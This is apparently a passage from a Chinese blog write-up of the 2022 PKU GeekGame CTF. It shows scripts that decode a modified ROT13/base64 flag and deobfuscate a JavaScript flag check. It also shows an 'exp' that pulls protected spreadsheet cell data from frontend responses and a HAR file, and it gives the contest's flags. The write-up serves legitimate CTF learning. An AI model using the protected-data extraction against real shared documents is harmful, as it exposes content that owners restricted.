                charAt <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>charAt <span class="token operator">-</span> <span class="token char">'\r'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>charAt <span class="token operator">&gt;=</span> <span class="token char">'5'</span> <span class="token operator">&amp;&amp;</span> charAt <span class="token operator">&lt;=</span> <span class="token char">'9'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                charAt <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>charAt <span class="token operator">-</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>charAt <span class="token operator">&gt;=</span> <span class="token char">'0'</span> <span class="token operator">&amp;&amp;</span> charAt <span class="token operator">&lt;=</span> <span class="token char">'4'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                charAt <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>charAt <span class="token operator">+</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            sb<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>charAt<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">return</span> sb<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> strArr<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">new</span> <span class="token class-name">GeekGame</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>这里的 rot13 看上去是魔改了的（？<em>难道是 CyberChef 遇到带数字的 ROT13 处理锅了？</em></p>
<p>flag1 就直接按照魔改后的 rot13 恢复一下，然后 base64 decode 就行</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64

<span class="token keyword">def</span> <span class="token function">rot13</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>
    r <span class="token operator">=</span> <span class="token string">''</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> s<span class="token punctuation">:</span>
        <span class="token keyword">if</span> i <span class="token operator">&gt;=</span> <span class="token string">'a'</span> <span class="token keyword">and</span> i <span class="token operator">&lt;=</span> <span class="token string">'m'</span><span class="token punctuation">:</span>
            x <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'\r'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">elif</span> i <span class="token operator">&gt;=</span> <span class="token string">'A'</span> <span class="token keyword">and</span> i <span class="token operator">&lt;=</span> <span class="token string">'M'</span><span class="token punctuation">:</span>
            x <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'\r'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">elif</span> i <span class="token operator">&gt;=</span> <span class="token string">'n'</span> <span class="token keyword">and</span> i <span class="token operator">&lt;=</span> <span class="token string">'z'</span><span class="token punctuation">:</span>
            x <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'\r'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">elif</span> i <span class="token operator">&gt;=</span> <span class="token string">'N'</span> <span class="token keyword">and</span> i <span class="token operator">&lt;=</span> <span class="token string">'Z'</span><span class="token punctuation">:</span>
            x <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'\r'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">elif</span> i <span class="token operator">&gt;=</span> <span class="token string">'5'</span> <span class="token keyword">and</span> i <span class="token operator">&lt;=</span> <span class="token string">'9'</span><span class="token punctuation">:</span>
            x <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">5</span><span class="token punctuation">)</span>
        <span class="token keyword">elif</span> i <span class="token operator">&gt;=</span> <span class="token string">'0'</span> <span class="token keyword">and</span> i <span class="token operator">&lt;=</span> <span class="token string">'4'</span><span class="token punctuation">:</span>
            x <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">5</span><span class="token punctuation">)</span>
        r <span class="token operator">+=</span> x
    <span class="token keyword">return</span> r

flag1 <span class="token operator">=</span> rot13<span class="token punctuation">(</span><span class="token string">"MzkuM8gmZJ6jZJHgnaMuqy4lMKM4"</span><span class="token punctuation">)</span>
<span class="token comment"># ZmxhZ3tzMW1wMWUtanZhdl9yZXZ9</span>
flag1 <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>flag1<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>flag1<span class="token punctuation">)</span>
<span class="token comment"># flag{s1mp1e-jvav_rev}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h4 id="Flag-2"><a href="#Flag-2" class="headerlink" title="Flag 2"></a>Flag 2</h4><p>这个部分执行了个 JavaScript 代码，nashorn 是个 js 执行引擎</p>
<p>首先把这部分异或一下拿到 js 代码，发现是混淆后的</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">s <span class="token operator">=</span> <span class="token string">"\u0089\u009a\u0081\u008c\u009b\u0086\u0080..."</span>
<span class="token comment"># len(s)</span>
<span class="token comment"># 444</span>

r <span class="token operator">=</span> <span class="token string">''</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> s<span class="token punctuation">:</span>
    x <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">239</span><span class="token punctuation">)</span>
    <span class="token comment"># print(x)</span>
    r <span class="token operator">+=</span> x
<span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span>
<span class="token comment"># function checkflag2(_0xa83ex2){var _0x724b=['charCodeAt','map','','split','stringify','Correct','Wrong','j-'];return (JSON[_0x724b[4]](_0xa83ex2[_0x724b[3]](_0x724b[2])[_0x724b[1]](function(_0xa83ex3){return _0xa83ex3[_0x724b[0]](0)}))== JSON[_0x724b[4]]([0,15,16,17,30,105,16,31,16,67,3,33,5,60,4,106,6,41,0,1,67,3,16,4,6,33,232][_0x724b[1]](function(_0xa83ex3){return (checkflag2+ _0x724b[2])[_0x724b[0]](_0xa83ex3)}))?_0x724b[5]:_0x724b[6])}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>稍微修复一下，手动解混淆就行了</p>
<p><code>checkflag2+ _0x724b[2]</code> 其实就是将函数本身给转化为字符串</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">checkflag2</span><span class="token punctuation">(</span><span class="token parameter">s</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token comment">// var _0x724b = ['charCodeAt', 'map', '', 'split', 'stringify', 'Correct', 'Wrong', 'j-'];</span>
    <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token constant">JSON</span><span class="token punctuation">[</span><span class="token string">'stringify'</span><span class="token punctuation">]</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span><span class="token string">'split'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'map'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">x</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> x<span class="token punctuation">[</span><span class="token string">'charCodeAt'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token constant">JSON</span><span class="token punctuation">[</span><span class="token string">'stringify'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">,</span> <span class="token number">105</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">,</span> <span class="token number">31</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">,</span> <span class="token number">67</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">33</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">60</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">106</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">41</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">67</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">33</span><span class="token punctuation">,</span> <span class="token number">232</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'map'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">x</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token string">"function checkflag2(_0xa83ex2){var _0x724b=['charCodeAt','map','','split','stringify','Correct','Wrong','j-'];return (JSON[_0x724b[4]](_0xa83ex2[_0x724b[3]](_0x724b[2])[_0x724b[1]](function(_0xa83ex3){return _0xa83ex3[_0x724b[0]](0)}))== JSON[_0x724b[4]]([0,15,16,17,30,105,16,31,16,67,3,33,5,60,4,106,6,41,0,1,67,3,16,4,6,33,232][_0x724b[1]](function(_0xa83ex3){return (checkflag2+ _0x724b[2])[_0x724b[0]](_0xa83ex3)}))?_0x724b[5]:_0x724b[6])}"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'charCodeAt'</span><span class="token punctuation">]</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token string">'Correct'</span> <span class="token operator">:</span> <span class="token string">'Wrong'</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span>

<span class="token comment">// JSON['stringify'](...)</span>
<span class="token comment">// '[102,108,97,103,123,106,97,118,97,115,99,114,105,112,116,45,111,98,102,117,115,99,97,116,111,114,125]'</span>
<span class="token comment">// flag{javascript-obfuscator}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>





<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="企鹅文档"><a href="#企鹅文档" class="headerlink" title="企鹅文档"></a>企鹅文档</h3><blockquote>
<blockquote>
<p>在一个开源软件学术大会上，主持人突然说：下面请认为无代码开发会减少安全漏洞的同志坐到会场左边，认为无代码开发会增加安全漏洞的同志坐到会场右边。</p>
<p>大部分人坐到了左边，少数人坐到右边，只有 You 酱还坐在中间不动。</p>
<p>主持人：侑同志，你到底认为无代码开发会减少还是增加漏洞？</p>
<p>回答：我认为无代码开发会减少原来存在的漏洞，但是会带来很多新的漏洞。</p>
<p>主持人慌忙说：那请您赶快坐到主席台上来。</p>
</blockquote>
<p>企鹅文档相信大家都很熟悉，它是企鹅公司久负盛名的在线文档编辑平台。但是基于企鹅文档的无代码 OA 系统是怎么回事呢？下面就让小编带大家一起了解吧。</p>
<p>基于企鹅文档的无代码 OA 系统，其实就是用企鹅文档来实现 OA 系统。很多企业、学校、组织之前使用 OA 系统来下发通知和填报报表，现在这些机构很多都转向了使用企鹅文档来下发通知和填报报表，当然可以选择问卷星这些类似的服务。</p>
<p>大家可能会感到惊讶，用企鹅文档来填报报表不会出现安全和隐私问题吗？但事实就是这样，小编也感到非常惊讶。</p>
<p>那么这就是基于企鹅文档的无代码 OA 系统了，大家有没有觉得很神奇呢？快快点击左下角的阅读原文来看看基于企鹅文档的无代码 OA 系统吧。</p>
<p> 你可以 <a target="_blank" rel="noopener" href="https://docs.qq.com/sheet/DV1lsUFRhQlp5eWtq?tab=BB08J2">访问企鹅文档</a></p>
</blockquote>
<p>说到 无代码平台，<del>就想到你校用那个 sb 无代码平台了，算了不说了信息早都漏完了</del>‘</p>
<p>直接这里看不到也复制不了，设为保护范围了</p>
<p><img src="/2022/11/30/CTF_2022PKUGeekGame/image-20221122034126547.png"></p>
<p>但是吧这是个文档，东西肯定都返回前端了的，搜一下就行了</p>
<p><img src="/2022/11/30/CTF_2022PKUGeekGame/image-20221122033712825.png"></p>
<p><img src="/2022/11/30/CTF_2022PKUGeekGame/image-20221122033740399.png"></p>
<p><strong>exp:</strong></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> json

<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'1.json'</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
    s <span class="token operator">=</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

r <span class="token operator">=</span> <span class="token string">''</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    r <span class="token operator">+=</span> s<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"2"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span>
<span class="token comment"># 通过以下链接访问题目机密flag：https://geekgame.pku.edu.cn/service/template/prob_kAiQcWHobs</span>

<span class="token comment"># 第二个请求</span>
<span class="token comment"># BzRJEs_next</span>
<span class="token comment"># https://geekgame.pku.edu.cn/service/template/prob_kAiQcWHobsBzRJEs_next</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>居然是套娃题！</p>
<p><img src="/2022/11/30/CTF_2022PKUGeekGame/image-20221122034419316.png"></p>
<p>附件给了个浏览器 Network 导出的 .har 文件，那就打开直接搜 </p>
<p><img src="/2022/11/30/CTF_2022PKUGeekGame/image-20221122034949816.png"></p>
<p>flag 相关的长这样</p>
<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span><span class="token property">"0"</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token property">"0"</span><span class="token operator">:</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token property">"2"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">"Below is your flag"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token property">"3"</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token property">"24"</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token property">"0"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token property">"3"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token property">"25"</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token property">"0"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token property">"3"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token property">"26"</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token property">"0"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token property">"3"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token property">"34"</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token property">"0"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token property">"3"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token property">"35"</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token property">"0"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token property">"3"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token property">"37"</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token property">"0"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token property">"3"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token property">"38"</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token property">"0"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token property">"3"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token property">"45"</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token property">"0"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token property">"3"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token property">"46"</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token property">"0"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token property">"3"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token property">"55"</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token property">"0"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token property">"3"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token property">"56"</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token property">"0"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token property">"3"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token property">"57"</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token property">"0"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token property">"3"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token property">"58"</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token property">"0"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token property">"3"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token property">"67"</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token property">"0"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token property">"3"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token property">"68"</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token property">"0"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token property">"3"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token property">"78"</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token property">"0"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token property">"3"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token property">"79"</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token property">"0"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token property">"3"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token property">"88"</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token property">"0"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token property">"3"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token property">"89"</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token property">"0"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token property">"3"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token property">"90"</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token property">"0"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token property">"3"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token property">"91"</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token property">"0"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token property">"3"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token property">"111"</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token property">"0"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token property">"3"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token property">"112"</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token property">"0"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token property">"3"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token property">"113"</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token property">"0"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token property">"3"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token property">"123"</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token property">"0"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token property">"3"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token property">"124"</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token property">"0"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token property">"3"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token property">"134"</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token property">"0"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token property">"3"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token property">"135"</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token property">"0"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token property">"3"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token property">"145"</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token property">"0"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token property">"3"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token property">"146"</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token property">"0"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token property">"3"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token property">"156"</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token property">"0"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token property">"3"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token property">"157"</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token property">"0"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token property">"3"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token property">"167"</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token property">"0"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token property">"3"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token property">"168"</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token property">"0"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token property">"3"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token property">"177"</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token property">"0"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token property">"3"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token property">"178"</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token property">"0"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token property">"3"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token property">"179"</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token property">"0"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token property">"3"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token property">"180"</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token property">"0"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token property">"3"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token property">"199"</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token property">"0"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token property">"3"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token property">"200"</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token property">"0"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token property">"3"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token property">"201"</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token property">"0"</span><span class="token 